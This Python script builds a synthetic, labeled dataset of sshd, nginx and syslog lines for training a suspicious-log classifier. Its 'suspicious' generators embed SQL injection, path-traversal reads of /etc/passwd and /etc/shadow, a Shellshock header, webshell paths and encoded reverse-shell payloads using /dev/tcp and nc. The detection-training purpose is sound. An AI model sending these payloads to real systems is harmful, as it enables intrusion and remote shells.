#!/usr/bin/env python3
"""Generate a labeled log-line dataset for LoRA fine-tuning.

Writes ~/lora/logs.jsonl: ~200 lines, roughly 50/50 benign vs suspicious,
in realistic sshd / nginx / syslog formats with varied IPs, users, and
timestamps. Deterministic (seeded) so reruns reproduce the same set.
"""

import json
import random
from datetime import datetime, timedelta
from pathlib import Path

SEED = 1337
N_PER_LABEL = 100
OUT_PATH = Path.home() / "lora" / "logs.jsonl"

rng = random.Random(SEED)

MONTHS = ["Jan", "Feb", "Mar", "Apr", "May", "Jun",
          "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]
HOSTS = ["web01", "web02", "db01", "api03", "auth01", "edge02", "app05"]
USERS = ["root", "admin", "deploy", "ubuntu", "www-data", "postgres",
         "jenkins", "alice", "bob", "svc_backup", "ec2-user"]
BENIGN_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "curl/8.4.0",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
]
BAD_UAS = ["sqlmap/1.8", "nikto/2.5.0", "() { :;}; /bin/bash", "Nmap NSE",
           "masscan/1.3", "Hello, World", "python-requests/2.31 (scanner)",
           "ZmEu", "dirbuster"]
BENIGN_PATHS = ["/", "/index.html", "/api/v1/health", "/static/app.css",
                "/favicon.ico", "/login", "/dashboard", "/api/v1/users/me",
                "/images/logo.png", "/robots.txt", "/api/v1/orders"]
CRON_JOBS = [
    "/usr/bin/certbot renew --quiet",
    "/opt/scripts/backup.sh",
    "/usr/bin/find /tmp -type f -mtime +7 -delete",
    "run-parts /etc/cron.hourly",
    "/usr/local/bin/log-rotate.sh",
    "/usr/bin/apt-get update",
]
SERVICES = ["nginx.service", "postgresql.service", "sshd.service",
            "cron.service", "docker.service", "redis-server.service"]
PACKAGES = ["openssl:amd64 3.0.13", "nginx 1.24.0-2", "curl 8.4.0-2",
            "libssl3:amd64 3.0.13", "python3.11 3.11.8-1",
            "ca-certificates 20240203"]

SQLI = [
    "/product?id=1'%20OR%20'1'='1",
    "/search?q=%27%3B%20DROP%20TABLE%20users%3B--",
    "/item?id=1%20UNION%20SELECT%20username,password%20FROM%20users",
    "/login?user=admin'--",
    "/api?id=1;WAITFOR%20DELAY%20'0:0:5'--",
]
TRAVERSAL = [
    "/../../../../etc/passwd",
    "/download?file=..%2f..%2f..%2fetc%2fshadow",
    "/static/..%2f..%2f..%2fwindows%2fwin.ini",
    "/view?page=../../../../proc/self/environ",
]
WEBSHELL_PATHS = ["/uploads/shell.php", "/tmp/reverse.php", "/cgi-bin/test.cgi",
                  "/wp-content/uploads/evil.php", "/.env", "/admin/cmd.jsp"]


def rand_ip(public=True):
    if public:
        return f"{rng.randint(11, 223)}.{rng.randint(0, 255)}." \
               f"{rng.randint(0, 255)}.{rng.randint(1, 254)}"
    return f"10.0.{rng.randint(0, 20)}.{rng.randint(1, 254)}"


def rand_syslog_ts():
    dt = datetime(2026, 1, 1) + timedelta(
        days=rng.randint(0, 180), hours=rng.randint(0, 23),
        minutes=rng.randint(0, 59), seconds=rng.randint(0, 59))
    return f"{MONTHS[dt.month - 1]} {dt.day:2d} {dt.strftime('%H:%M:%S')}"


def rand_clf_ts():
    dt = datetime(2026, 1, 1) + timedelta(
        days=rng.randint(0, 180), hours=rng.randint(0, 23),
        minutes=rng.randint(0, 59), seconds=rng.randint(0, 59))
    return dt.strftime("%d/%b/%Y:%H:%M:%S +0000")


def pid():
    return rng.randint(400, 32000)


# ---- benign generators ----

def b_auth_success():
    ts, host, user, ip = rand_syslog_ts(), rng.choice(HOSTS), \
        rng.choice(USERS), rand_ip()
    port = rng.randint(30000, 65000)
    return (f"{ts} {host} sshd[{pid()}]: Accepted publickey for {user} "
            f"from {ip} port {port} ssh2: RSA "
            f"SHA256:{''.join(rng.choice('abcdef0123456789') for _ in range(20))}")


def b_sudo_ok():
    ts, host, user = rand_syslog_ts(), rng.choice(HOSTS), rng.choice(USERS)
    cmd = rng.choice(["/usr/bin/systemctl restart nginx",
                      "/usr/bin/apt-get upgrade", "/bin/journalctl -u sshd"])
    return (f"{ts} {host} sudo: {user} : TTY=pts/0 ; PWD=/home/{user} ; "
            f"USER=root ; COMMAND={cmd}")


def b_cron():
    ts, host, user = rand_syslog_ts(), rng.choice(HOSTS), rng.choice(USERS)
    return (f"{ts} {host} CRON[{pid()}]: ({user}) CMD ({rng.choice(CRON_JOBS)})")


def b_http_200():
    ip, ts = rand_ip(), rand_clf_ts()
    path = rng.choice(BENIGN_PATHS)
    method = rng.choice(["GET", "GET", "GET", "POST"])
    size = rng.randint(120, 48000)
    code = rng.choice([200, 200, 200, 204, 301, 304])
    return (f'{ip} - - [{ts}] "{method} {path} HTTP/1.1" {code} {size} '
            f'"-" "{rng.choice(BENIGN_UAS)}"')


def b_service_start():
    ts, host = rand_syslog_ts(), rng.choice(HOSTS)
    svc = rng.choice(SERVICES)
    return (f"{ts} {host} systemd[1]: Started {svc} - "
            f"{svc.split('.')[0]} daemon.")


def b_pkg_update():
    ts, host = rand_syslog_ts(), rng.choice(HOSTS)
    return (f"{ts} {host} dpkg[{pid()}]: status installed "
            f"{rng.choice(PACKAGES)}")


BENIGN_GENS = [b_auth_success, b_sudo_ok, b_cron, b_http_200,
               b_service_start, b_pkg_update]


# ---- suspicious generators ----

def s_brute_force():
    ts, host, user, ip = rand_syslog_ts(), rng.choice(HOSTS), \
        rng.choice(["root", "admin", "test", "oracle", "user", "postgres"]), \
        rand_ip()
    port = rng.randint(30000, 65000)
    return (f"{ts} {host} sshd[{pid()}]: Failed password for "
            f"{'invalid user ' if rng.random() < 0.5 else ''}{user} "
            f"from {ip} port {port} ssh2")


def s_sqli():
    ip, ts = rand_ip(), rand_clf_ts()
    return (f'{ip} - - [{ts}] "GET {rng.choice(SQLI)} HTTP/1.1" '
            f'{rng.choice([200, 403, 500])} {rng.randint(0, 900)} "-" '
            f'"{rng.choice(BAD_UAS)}"')


def s_traversal():
    ip, ts = rand_ip(), rand_clf_ts()
    return (f'{ip} - - [{ts}] "GET {rng.choice(TRAVERSAL)} HTTP/1.1" '
            f'{rng.choice([200, 403, 404])} {rng.randint(0, 4000)} "-" '
            f'"{rng.choice(BAD_UAS)}"')


def s_privesc():
    ts, host, user, ip = rand_syslog_ts(), rng.choice(HOSTS), \
        rng.choice(USERS), rand_ip()
    variant = rng.choice([
        f"sudo: {user} : user NOT in sudoers ; TTY=pts/1 ; "
        f"PWD=/tmp ; USER=root ; COMMAND=/bin/bash",
        f"sudo: 3 incorrect password attempts ; {user} ; "
        f"COMMAND=/usr/bin/passwd root",
        f"kernel: [ {rng.randint(1000, 99999)}.{rng.randint(0, 999)}] "
        f"audit: exe=\"/tmp/.x\" uid={rng.randint(1000, 1050)} "
        f"attempted setuid(0)",
    ])
    return f"{ts} {host} {variant}"


def s_outbound():
    ts, host, ip = rand_syslog_ts(), rng.choice(HOSTS), rand_ip()
    port = rng.choice([4444, 1337, 6667, 8080, 9001, 31337])
    return (f"{ts} {host} kernel: [UFW BLOCK] OUT=eth0 SRC=10.0.0.{rng.randint(2, 254)} "
            f"DST={ip} PROTO=TCP SPT={rng.randint(30000, 60000)} DPT={port} "
            f"(unexpected outbound connection)")


def s_bad_ua():
    ip, ts = rand_ip(), rand_clf_ts()
    path = rng.choice(BENIGN_PATHS + ["/admin", "/phpmyadmin", "/wp-login.php"])
    return (f'{ip} - - [{ts}] "GET {path} HTTP/1.1" '
            f'{rng.choice([200, 404, 403])} {rng.randint(0, 3000)} "-" '
            f'"{rng.choice(BAD_UAS)}"')


def s_reverse_shell():
    ip, ts = rand_ip(), rand_clf_ts()
    payload = rng.choice([
        "/index.php?cmd=bash%20-i%20%3E%26%20/dev/tcp/{}/4444%200%3E%261".format(ip),
        "/?c=python%20-c%20'import%20socket,os,pty'",
        "/upload.php?f=" + rng.choice(WEBSHELL_PATHS),
        "/api?exec=nc%20-e%20/bin/sh%20{}%201337".format(ip),
    ])
    return (f'{ip} - - [{ts}] "POST {payload} HTTP/1.1" '
            f'{rng.choice([200, 500])} {rng.randint(0, 500)} "-" '
            f'"{rng.choice(BAD_UAS)}"')


SUSPICIOUS_GENS = [s_brute_force, s_sqli, s_traversal, s_privesc,
                   s_outbound, s_bad_ua, s_reverse_shell]


def build(label, gens, n):
    seen, rows = set(), []
    while len(rows) < n:
        line = rng.choice(gens)()
        if line in seen:
            continue
        seen.add(line)
        rows.append({"text": line, "label": label})
    return rows


def main():
    rows = build("benign", BENIGN_GENS, N_PER_LABEL) + \
        build("suspicious", SUSPICIOUS_GENS, N_PER_LABEL)
    rng.shuffle(rows)

    OUT_PATH.parent.mkdir(parents=True, exist_ok=True)
    with OUT_PATH.open("w") as f:
        for r in rows:
            f.write(json.dumps(r) + "\n")

    n_benign = sum(1 for r in rows if r["label"] == "benign")
    n_susp = len(rows) - n_benign
    print(f"wrote {OUT_PATH}")
    print(f"total: {len(rows)}  benign: {n_benign}  suspicious: {n_susp}")
    for label in ("benign", "suspicious"):
        print(f"\n--- {label} sample ---")
        shown = 0
        for r in rows:
            if r["label"] == label:
                print(r["text"])
                shown += 1
                if shown == 3:
                    break


if __name__ == "__main__":
    main()
